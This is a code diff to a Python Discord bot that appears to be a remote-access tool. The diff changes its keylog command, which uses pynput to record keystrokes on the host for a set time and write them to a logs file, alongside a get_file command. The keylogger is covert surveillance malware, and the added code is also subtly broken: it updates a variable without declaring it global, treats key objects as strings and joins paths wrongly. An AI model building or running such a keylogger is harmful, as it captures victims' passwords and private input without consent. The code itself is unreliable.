@@ -25,6 +25,8 @@ config_dir = {
 	'hybrids' : '.'							# where command config will be placed
 }
 
+logger_logs = ''
+
 #####################################
 #    ADDITIONAL NEEDED FUNCTIONS    #
 #####################################
@@ -45,7 +47,7 @@ def limiter(str_input, limit):
 # whenever a key is pressed, do the ff.
 def on_key_press(key):
 	# look where to load the config files
-	print (key)
+	logger_logs += key
 
 #############################
 #    EVENTS DEFINED HERE    #
@@ -158,7 +160,7 @@ async def get_file(ctx, file_path):
 	description='Command that starts the keylogger and saves the file on config directory.'
 )
 async def keylog(ctx, timeout : int):
-	from pynput.keyboard import Listener, Key
+	from pynput.keyboard import Listener
 
 	await ctx.send(f'[CommandBot {nickname}] Starting keylogger')
 	await ctx.send(f'[*] Text output will be saved at : {config_dir["keylogs"]}')
@@ -167,8 +169,8 @@ async def keylog(ctx, timeout : int):
 		return
 
 	# check if file already exists (create one if none)
-	if (not os.path.isfile(config_dir['keylogs'] + '\\logs.txt')):
-		open(config_dir['keylogs'] + '\\logs.txt', 'w').write(' ')
+	if (not os.path.isfile(os.path.join(config_dir['keylogs'], '\\logs.txt'))):
+		open(os.path.join(config_dir['keylogs'], '\\logs.txt'), 'w').write(' ')
 
 	# start the keylogger on this part
 	with Listener(on_press=on_key_press) as listener:
@@ -183,7 +185,13 @@ async def keylog(ctx, timeout : int):
 		th = threading.Thread(target=listener.join)
 		th.start()
 
-	await ctx.send(f'[*] Started keylogger for {timeout} seconds.')
+		await ctx.send(f'[*] Started keylogger for {timeout} seconds.')
+		th.join()
+
+		# after logging, save the text logged
+		fr = open(os.path.join(config_dir['keylogs'], '\\logs.txt'), 'r').read()
+		fw = open(os.path.join(config_dir['keylogs'], '\\logs.txt'), 'w')
+		fw.write(fr + logger_logs)
 
 
 @bot.command(
